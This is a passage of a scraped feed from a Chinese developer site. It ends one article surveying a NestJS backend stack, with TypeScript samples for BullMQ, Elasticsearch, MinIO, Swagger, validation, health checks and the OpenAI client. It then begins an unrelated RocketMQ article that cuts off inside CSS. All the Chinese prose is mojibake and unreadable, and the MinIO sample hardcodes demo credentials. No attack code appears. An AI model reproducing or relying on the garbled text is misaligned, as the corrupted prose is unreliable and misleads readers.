<p>ç”Ÿäº§è€…ï¼ˆæŠ•é€’ä»»åŠ¡ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// task.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">InjectQueue</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/bullmq'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Queue</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'bullmq'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-meta">@InjectQueue</span>(<span class="hljs-string">'tasks'</span>) <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> queue: Queue</span>) {}

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">createTask</span>(<span class="hljs-params">payload: <span class="hljs-built_in">any</span></span>) {
    <span class="hljs-keyword">const</span> job = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'process'</span>, payload);
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">jobId</span>: job.<span class="hljs-property">id</span> };
  }
}
</code></pre>
<h2 data-id="heading-8"><code>Elasticsearch</code></h2>
<p><code>Elasticsearch</code> åœ¨æ–‡æ¡£å’ŒçŸ¥è¯†ç±»ç³»ç»Ÿä¸­é€šå¸¸ç”¨ä½œç»“æ„åŒ–æœç´¢ä¸æ—¥å¿—ç´¢å¼•å¼•æ“ã€‚é€šè¿‡ <code>@elastic/elasticsearch</code> å®¢æˆ·ç«¯å¯ä»¥åœ¨ Nest çš„ Service é‡Œå°è£…æœç´¢æ¥å£ï¼Œå¯¹å¤–ç»Ÿä¸€æš´éœ²â€œæœç´¢æ–‡æ¡£â€â€œæœç´¢æ—¥å¿—â€ç­‰èƒ½åŠ›ã€‚</p>
<p>ç›¸å¯¹æ•°æ®åº“åŸç”ŸæŸ¥è¯¢ï¼Œ<code>Elasticsearch</code> æ›´æ“…é•¿å¤æ‚æŸ¥è¯¢ã€èšåˆç»Ÿè®¡ã€æ¨¡ç³Šæœç´¢ä¸æœç´¢ç»“æœæ’åºï¼Œæ˜¯æå‡æœç´¢ä½“éªŒçš„å…³é”®ç»„ä»¶ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<p>å°è£…æœç´¢ Serviceï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// search.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Client</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@elastic/elasticsearch'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchService</span> {
  <span class="hljs-keyword">private</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>({ <span class="hljs-attr">node</span>: <span class="hljs-string">'http://localhost:9200'</span> });

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">searchDocs</span>(<span class="hljs-params">keyword: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">search</span>({
      <span class="hljs-attr">index</span>: <span class="hljs-string">'documents'</span>,
      <span class="hljs-attr">query</span>: {
        <span class="hljs-attr">multi_match</span>: {
          <span class="hljs-attr">query</span>: keyword,
          <span class="hljs-attr">fields</span>: [<span class="hljs-string">'title'</span>, <span class="hljs-string">'content'</span>],
        },
      },
    });
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">hits</span>.<span class="hljs-property">hits</span>;
  }
}
</code></pre>
<h2 data-id="heading-9">å¯¹è±¡å­˜å‚¨ï¼ˆ<code>MinIO</code>ï¼‰</h2>
<p>å½“ç³»ç»Ÿæœ‰å¤§é‡æ–‡ä»¶ï¼ˆå¦‚ <code>PDF</code>ã€<code>Word</code>ã€å›¾ç‰‡ã€éŸ³é¢‘ï¼‰æ—¶ï¼Œæœ¬åœ°ç£ç›˜å¾ˆå¿«å°±ä¼šåƒä¸æ¶ˆï¼Œè¿™æ—¶å¯ä»¥ç”¨è‡ªå»ºçš„ <code>MinIO</code> é›†ç¾¤æ¥åšå¯¹è±¡å­˜å‚¨ã€‚å®ƒè´Ÿè´£é•¿æœŸä¿å­˜å¤§æ–‡ä»¶ï¼Œåç«¯åªéœ€è¦å…³å¿ƒå¯¹è±¡åå’Œè®¿é—®åœ°å€ï¼Œä¸å¿…å†ç›´æ¥ç®¡ç†ç£ç›˜ã€‚</p>
<p>åœ¨ Nest ä¸­é€šå¸¸ä¼šå°è£…ä¸€ä¸ªå­˜å‚¨ Serviceï¼Œå¯¹ä¸Šå±‚æš´éœ²â€œä¸Šä¼ æ–‡ä»¶â€â€œç”Ÿæˆä¸‹è½½åœ°å€â€ç­‰æ–¹æ³•ï¼›åŒæ—¶é…åˆ <code>imagekit</code>ã€<code>sharp</code>ã€<code>exiftool-vendored</code>ã€<code>pdf-parse</code>ã€<code>mammoth</code> ç­‰ï¼Œå¯¹æ–‡ä»¶åšå‹ç¼©ã€é¢„è§ˆã€å…ƒä¿¡æ¯ä¸æ–‡æœ¬æå–ç­‰å¤„ç†ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// storage.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Client</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'minio'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StorageService</span> {
  <span class="hljs-keyword">private</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>({
    <span class="hljs-attr">endPoint</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">9000</span>,
    <span class="hljs-attr">useSSL</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">accessKey</span>: <span class="hljs-string">'minio'</span>,
    <span class="hljs-attr">secretKey</span>: <span class="hljs-string">'minio123'</span>,
  });

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">bucket: <span class="hljs-built_in">string</span>, objectName: <span class="hljs-built_in">string</span>, buffer: Buffer</span>) {
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">putObject</span>(bucket, objectName, buffer);
    <span class="hljs-keyword">return</span> { bucket, objectName };
  }
}
</code></pre>
<h2 data-id="heading-10"><code>@nestjs/swagger</code></h2>
<p><code>@nestjs/swagger</code> è´Ÿè´£ä» Controller å’Œ DTO çš„è£…é¥°å™¨ä¸­ç”Ÿæˆ OpenAPI æ–‡æ¡£ï¼Œè®©æ¥å£å®šä¹‰å’Œä»£ç å®ç°ä¿æŒåŒæ­¥ï¼Œä¸å†éœ€è¦å•ç‹¬ç»´æŠ¤ä¸€ä»½å®¹æ˜“è¿‡æœŸçš„æ¥å£æ–‡æ¡£ã€‚</p>
<p>åœ¨å‰åç«¯åˆ†ç¦»é¡¹ç›®ä¸­ï¼ŒSwagger æ–‡æ¡£å¯ä»¥åŒæ—¶æœåŠ¡å‰ç«¯ã€æµ‹è¯•ä¸äº§å“ï¼šå‰ç«¯å¯¹é½è¯·æ±‚å’Œå“åº”ç»“æ„ï¼Œæµ‹è¯•åšæ¥å£éªŒè¯ï¼Œäº§å“äº†è§£åç«¯å·²æœ‰èƒ½åŠ›ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts ç‰‡æ®µ</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">SwaggerModule</span>, <span class="hljs-title class_">DocumentBuilder</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/swagger'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AppModule</span>);

  <span class="hljs-keyword">const</span> config = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DocumentBuilder</span>()
    .<span class="hljs-title function_">setTitle</span>(<span class="hljs-string">'API æ–‡æ¡£'</span>)
    .<span class="hljs-title function_">setDescription</span>(<span class="hljs-string">'æœåŠ¡æ¥å£è¯´æ˜'</span>)
    .<span class="hljs-title function_">setVersion</span>(<span class="hljs-string">'1.0'</span>)
    .<span class="hljs-title function_">build</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">document</span> = <span class="hljs-title class_">SwaggerModule</span>.<span class="hljs-title function_">createDocument</span>(app, config);
  <span class="hljs-title class_">SwaggerModule</span>.<span class="hljs-title function_">setup</span>(<span class="hljs-string">'docs'</span>, app, <span class="hljs-variable language_">document</span>);

  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
}
</code></pre>
<h2 data-id="heading-11"><code>class-validator</code> å’Œ <code>class-transformer</code></h2>
<p><code>class-validator</code> é€šè¿‡åœ¨ DTO ç±»å±æ€§ä¸Šæ·»åŠ è£…é¥°å™¨ï¼ˆå¦‚ <code>IsString</code>ã€<code>IsInt</code>ã€<code>IsOptional</code> ç­‰ï¼‰å®šä¹‰å­—æ®µçš„åˆæ³•è§„åˆ™ï¼Œ<code>class-transformer</code> è´Ÿè´£æŠŠåŸå§‹è¯·æ±‚ JSON è½¬æ¢æˆ DTO å®ä¾‹ã€‚é…åˆå…¨å±€ <code>ValidationPipe</code>ï¼Œå¯ä»¥ä¿è¯è¿›å…¥ Controller çš„æ•°æ®å·²ç»è¿‡æ ¡éªŒå’Œè½¬æ¢ã€‚</p>
<p>è¿™ä¸€ä½“ç³»å¤§å¤§å‡å°‘äº†æ‰‹å†™ if æ ¡éªŒçš„é‡å¤åŠ³åŠ¨ï¼ŒåŒæ—¶ç¡®ä¿é”™è¯¯è¯·æ±‚åœ¨ç»Ÿä¸€å…¥å£è¢«æ‹¦æˆªå¹¶æŠ›å‡ºåˆé€‚çš„ HTTP å¼‚å¸¸ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// create-user.dto.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">IsEmail</span>, <span class="hljs-title class_">IsString</span>, <span class="hljs-title class_">MinLength</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'class-validator'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateUserDto</span> {
  <span class="hljs-meta">@IsEmail</span>()
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-meta">@IsString</span>()
  <span class="hljs-meta">@MinLength</span>(<span class="hljs-number">6</span>)
  <span class="hljs-attr">password</span>: <span class="hljs-built_in">string</span>;
}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// user.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Body</span>, <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Post</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CreateUserDto</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./dto/create-user.dto'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'users'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
  <span class="hljs-meta">@Post</span>()
  <span class="hljs-title function_">create</span>(<span class="hljs-params"><span class="hljs-meta">@Body</span>() dto: CreateUserDto</span>) {
    <span class="hljs-keyword">return</span> dto;
  }
}
</code></pre>
<h2 data-id="heading-12"><code>Prometheus</code> å’Œ <code>Terminus</code></h2>
<p><code>@willsoto/nestjs-prometheus</code> æ­é… <code>prom-client</code> å¯ä»¥æ–¹ä¾¿åœ°æš´éœ²å„ç§æŒ‡æ ‡ç«¯ç‚¹ï¼Œä¾‹å¦‚ HTTP å»¶è¿Ÿã€é”™è¯¯ç‡ã€é˜Ÿåˆ—å †ç§¯æƒ…å†µç­‰ï¼›<code>@nestjs/terminus</code> åˆ™ä¸“æ³¨äºå¥åº·æ£€æŸ¥ï¼Œé€šè¿‡å¤šç§ <code>HealthIndicator</code> æ£€æŸ¥æ•°æ®åº“ã€<code>Redis</code>ã€<code>Elasticsearch</code>ã€<code>Qdrant</code> ç­‰ä¾èµ–æœåŠ¡æ˜¯å¦å¯ç”¨ã€‚</p>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ï¼Œè¿™ä¸¤è€…ä¸ºâ€œå¯è§‚æµ‹æ€§â€æ‰“åŸºç¡€ï¼Œä½¿è¿ç»´å’Œå¼€å‘å¯ä»¥å¿«é€Ÿæ„ŸçŸ¥å’Œå®šä½é—®é¢˜ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// health.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">HealthCheck</span>,
  <span class="hljs-title class_">HealthCheckService</span>,
  <span class="hljs-title class_">TypeOrmHealthIndicator</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/terminus'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'health'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HealthController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> health: HealthCheckService,
    <span class="hljs-keyword">private</span> db: TypeOrmHealthIndicator,
  </span>) {}

  <span class="hljs-meta">@Get</span>()
  <span class="hljs-meta">@HealthCheck</span>()
  <span class="hljs-title function_">check</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">health</span>.<span class="hljs-title function_">check</span>([
      <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">pingCheck</span>(<span class="hljs-string">'database'</span>),
    ]);
  }
}
</code></pre>
<h2 data-id="heading-13"><code>OpenAI</code> å’Œ <code>LangChain</code></h2>
<p><code>openai</code> æä¾›ä¸å¤§æ¨¡å‹äº¤äº’çš„åŸºç¡€æ¥å£ï¼Œè€Œ <code>langchain</code>ã€<code>@langchain/core</code>ã€<code>@langchain/community</code>ã€<code>@langchain/openai</code>ã€<code>@langchain/textsplitters</code> åˆ™æŠŠæ¨¡å‹è°ƒç”¨ã€æç¤ºæ¨¡æ¿ã€å·¥å…·è°ƒç”¨ã€é•¿æ–‡æ¡£åˆ‡ç‰‡ç­‰å¤æ‚é€»è¾‘æŠ½è±¡æˆå¯ç»„åˆçš„æ¨¡å—ã€‚å¯¹äºæ–‡æ¡£å·¥ä½œæµç±»é¡¹ç›®ï¼Œè¿™ä¸€å±‚å°±æ˜¯ä»â€œæ™®é€šæ–‡æ¡£ç³»ç»Ÿâ€å‡çº§ä¸ºâ€œæ™ºèƒ½æ–‡æ¡£ç³»ç»Ÿâ€çš„å…³é”®ã€‚</p>
<p>åœ¨ Nest ä¸­ï¼Œé€šå¸¸ä¼šæ‹†å‡ºä¸€ä¸ª AI æ¨¡å—ï¼ŒæŠŠâ€œå‘é‡æ£€ç´¢ + RAG + æ¨¡å‹è°ƒç”¨â€å°è£…åœ¨ Service é‡Œï¼Œå†é€šè¿‡å°‘é‡ HTTP æ¥å£æš´éœ²å‡ºé—®ç­”ã€æ€»ç»“ã€æ¶¦è‰²ç­‰èƒ½åŠ›ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ai.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'openai'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AiService</span> {
  <span class="hljs-keyword">private</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({ <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span> });

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">prompt: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">'gpt-4.1-mini'</span>,
      <span class="hljs-attr">messages</span>: [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: prompt }],
    });
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">message</span>?.<span class="hljs-property">content</span> ?? <span class="hljs-string">''</span>;
  }
}
</code></pre>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>å¦‚æœåªæ˜¯æƒ³æŠŠæ¥å£â€œè·‘èµ·æ¥â€ï¼Œä¹Ÿè®¸åªè¦ <code>NestJS</code> åŠ ä¸Šä¸€ä¸¤ä¸ªåº“å°±å¤Ÿç”¨ï¼›ä½†ä¸€æ—¦è¦æ‰›èµ·é‰´æƒã€å®æ—¶ååŒã€AIã€æ–‡ä»¶ä¸æœç´¢è¿™äº›å®Œæ•´èƒ½åŠ›ï¼Œå°±å¾ˆå®¹æ˜“æ¼”å˜æˆè¿™ç¯‡æ–‡ç« å‰é¢åˆ—å‡ºæ¥çš„è¿™ä¸€æ•´å¥—æŠ€æœ¯æ ˆï¼š<code>NestJS</code> + <code>TypeScript</code> æ‰“åŸºç¡€ï¼Œ<code>Fastify</code> æä¾›é«˜æ€§èƒ½ HTTP å…¥å£ï¼Œ<code>Prisma</code> + <code>MySql</code> ç®¡æ•°æ®ï¼Œ<code>Redis</code> + <code>BullMQ</code> ç®¡ç¼“å­˜å’Œé˜Ÿåˆ—ï¼Œ<code>Elasticsearch</code> ç®¡æœç´¢ï¼Œ<code>MinIO</code> ç®¡æ–‡ä»¶ï¼Œå†åŠ ä¸Š <code>@nestjs/swagger</code>ã€<code>class-validator</code>ã€<code>Prometheus</code>ã€<code>Terminus</code> å’Œ <code>OpenAI</code>ã€<code>LangChain</code> è¿™äº›å‘¨è¾¹ï¼Œè®©é¡¹ç›®ä»â€œèƒ½è·‘â€å˜æˆâ€œå¥½ç”¨ã€å¯ç»´æŠ¤ã€å¯æ‰©å±•â€ã€‚</p>
<p>å¯¹å‰ç«¯è½¬å…¨æ ˆæ¥è¯´ï¼Œè¿™å¥—ç»„åˆæœ‰ä¸¤ä¸ªç°å®çš„å¥½å¤„ï¼šä¸€æ˜¯è¯­æ³•å’Œæ€è·¯éƒ½å›´ç»• <code>TypeScript</code> å±•å¼€ï¼Œä¸Šæ‰‹æˆæœ¬å¯æ§ï¼›äºŒæ˜¯æ¯ä¸€ä¸ªç¯èŠ‚éƒ½æœ‰æˆç†Ÿçš„ Nest é›†æˆï¼ˆæ¨¡å—ã€è£…é¥°å™¨ã€ç¤ºä¾‹ä»£ç ï¼‰ï¼Œå¯ä»¥æŒ‰éœ€é€æ­¥å¼•å…¥ï¼Œè€Œä¸å¿…ä¸€å£æ°”åƒä¸‹å…¨éƒ¨ã€‚ä½ å¯ä»¥å…ˆç”¨ <code>NestJS</code> + <code>Prisma</code> + <code>Redis</code> èµ·ä¸€ä¸ªç®€å•é¡¹ç›®ï¼Œå†æ…¢æ…¢æŠŠé˜Ÿåˆ—ã€æœç´¢ã€å¯¹è±¡å­˜å‚¨å’Œ AI èƒ½åŠ›è¡¥ä¸Šï¼Œæœ€ç»ˆæ­å‡ºä¸€å¥—é€‚åˆè‡ªå·±é•¿æœŸç»´æŠ¤çš„åç«¯è„šæ‰‹æ¶ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸‡å­—ç¯‡å¹…ï¼‰]]></title>    <link>https://juejin.cn/post/7597283981185122356</link>    <guid>https://juejin.cn/post/7597283981185122356</guid>    <pubDate>2026-01-20T14:12:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185122356" data-draft-id="7597243334177374248" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸‡å­—ç¯‡å¹…ï¼‰"/> <meta itemprop="keywords" content="åç«¯,RocketMQ,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-20T14:12:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€’æ”¾å§å¾·å¾·"/> <meta itemprop="url" content="https://juejin.cn/user/2502950820787672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸‡å­—ç¯‡å¹…ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2502950820787672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€’æ”¾å§å¾·å¾·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:12:51.000Z" title="Tue Jan 20 2026 14:12:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»29åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px 